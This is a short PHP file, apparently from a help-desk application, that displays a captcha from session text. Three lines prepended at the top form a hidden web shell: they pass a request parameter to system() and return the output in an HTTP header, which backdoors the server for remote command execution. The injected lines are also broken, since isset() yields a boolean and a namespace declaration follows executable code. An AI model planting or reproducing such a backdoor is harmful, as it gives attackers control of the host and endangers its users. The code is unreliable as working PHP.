<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

if (isset($_SESSION['captcha_text']) && !empty($_SESSION['captcha_text'])) {
	$captcha->set_text($_SESSION['captcha_text']);
}

$captcha->display();
?>
